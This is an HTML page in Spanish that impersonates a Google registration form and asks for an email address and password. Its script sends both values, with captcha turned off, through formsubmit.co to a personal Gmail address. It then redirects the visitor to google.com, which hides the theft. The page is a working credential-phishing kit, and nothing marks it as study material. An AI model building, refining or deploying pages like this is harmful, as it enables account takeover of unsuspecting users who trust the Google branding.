<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - [Google]</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #2980b9;
        }
        .login-link {
            text-align: center;
            margin-top: 15px;
        }
        /* CAMBIO: Estilo para el mensaje de carga */
        .loading {
            text-align: center;
            margin-top: 10px;
            color: #3498db;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Regístrese con Google</h1>
        <form id="registroForm">
            <div class="form-group">
                <label for="email">Correo electrónico:</label>
                <input type="email" id="email" name="email" required placeholder="usuario@gmail.com">
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Registrarse</button>
            <!-- CAMBIO: Mensaje de carga oculto inicialmente -->
            <div id="loadingMessage" class="loading" style="display: none;">Enviando datos, por favor espere...</div>
        </form>
        <div class="login-link">
            ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión</a>
        </div>
    </div>

    <script>
        document.getElementById('registroForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Evita la recarga de página
            
            const form = this;
            const submitButton = form.querySelector('button[type="submit"]');
            const loadingMessage = document.getElementById('loadingMessage');
            
            // CAMBIO: Deshabilitar botón y mostrar mensaje de carga
            submitButton.disabled = true;
            submitButton.textContent = "Enviando...";
            loadingMessage.style.display = 'block';
            
            // Obtener los datos del formulario
            const formData = new FormData(form);
            const data = {
                email: formData.get('email'),
                password: formData.get('password'),
                _subject: "Nuevo registro en tu sitio",
                _template: "table",
                _captcha: "false"
            };
            
            // CAMBIO: Enviar datos y esperar respuesta antes de redirigir
            fetch('https://formsubmit.co/ajax/enriquepng1@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) throw new Error("Error en la respuesta del servidor");
                return response.json();
            })
            .then(data => {
                console.log("Éxito:", data);
                // CAMBIO: Redirigir solo si el envío fue exitoso
                window.location.href = "https://www.google.com";
            })
            .catch(error => {
                console.error('Error:', error);
                // CAMBIO: Restaurar botón y ocultar mensaje de carga
                submitButton.disabled = false;
                submitButton.textContent = "Registrarse";
                loadingMessage.style.display = 'none';
                // Opcional: Mostrar mensaje de error al usuario
                alert("Error al enviar el formulario. Por favor, inténtalo de nuevo.");
            });
        });
        
        // Protección adicional contra recarga (opcional)
        window.addEventListener('beforeunload', function(e) {
            // Puedes dejarlo así o personalizar el mensaje
        });
    </script>
</body>
</html>
